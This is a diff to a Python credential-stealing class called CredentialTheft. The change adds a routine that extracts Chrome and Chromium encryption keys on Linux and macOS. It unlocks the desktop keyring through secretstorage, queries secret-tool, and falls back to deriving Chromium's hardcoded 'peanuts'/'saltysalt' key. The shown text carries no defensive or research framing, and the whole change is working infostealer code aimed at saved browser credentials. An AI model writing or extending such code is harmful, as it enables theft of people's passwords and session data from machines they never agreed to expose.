@@ -136,10 +136,71 @@ class CredentialTheft:
                 return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
 
             # Linux/macOS: key is encrypted with the system keyring
-            return encrypted_key
+            # Try multiple methods in order of preference
+            return CredentialTheft._decrypt_chrome_key_linux(encrypted_key, local_state_path.parent)
 
         except Exception:
             return None
+
+    @staticmethod
+    def _decrypt_chrome_key_linux(encrypted_key: bytes, browser_config_dir: Path) -> Optional[bytes]:
+        """
+        Decrypt Chrome/Chromium AES key on Linux/macOS.
+        
+        Tries in order:
+        1. libsecret via secretstorage (desktop environments with keyring)
+        2. secret-tool CLI (headless but with dbus)
+        3. Chromium basic_text fallback (PBKDF2-SHA1, 1 iter, salt="saltysalt", password="peanuts")
+        """
+        # Method 1: libsecret via secretstorage
+        try:
+            import secretstorage
+            bus = secretstorage.dbus_init()
+            collection = secretstorage.get_default_collection(bus)
+            collection.unlock()
+            for item in collection.get_all_items():
+                label = item.get_label()
+                if ("Chrome" in label or "Chromium" in label) and \
+                   ("Safe Storage" in label or "key" in label.lower()):
+                    secret = item.get_secret()
+                    if secret and len(secret) in (16, 32):
+                        return secret
+        except Exception:
+            pass
+
+        # Method 2: secret-tool CLI
+        try:
+            import subprocess
+            app_name = "chrome" if "chrome" in str(browser_config_dir).lower() else "chromium"
+            result = subprocess.run(
+                ["secret-tool", "lookup", "application", app_name],
+                capture_output=True, text=True, timeout=5
+            )
+            if result.returncode == 0 and result.stdout.strip():
+                key = result.stdout.strip().encode()
+                if len(key) in (16, 32):
+                    return key
+        except Exception:
+            pass
+
+        # Method 3: Chromium basic_text fallback (hardcoded derivation)
+        # Used on headless servers / containers without keyring
+        try:
+            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+            from cryptography.hazmat.primitives import hashes
+            
+            kdf = PBKDF2HMAC(
+                algorithm=hashes.SHA1(),
+                length=16,
+                salt=b"saltysalt",
+                iterations=1,
+            )
+            return kdf.derive(b"peanuts")
+        except Exception:
+            pass
+
+        # Last resort: return the encrypted key as-is (won't work for decryption)
+        return None
 
     @staticmethod
     def steal_browser_credentials() -> dict:
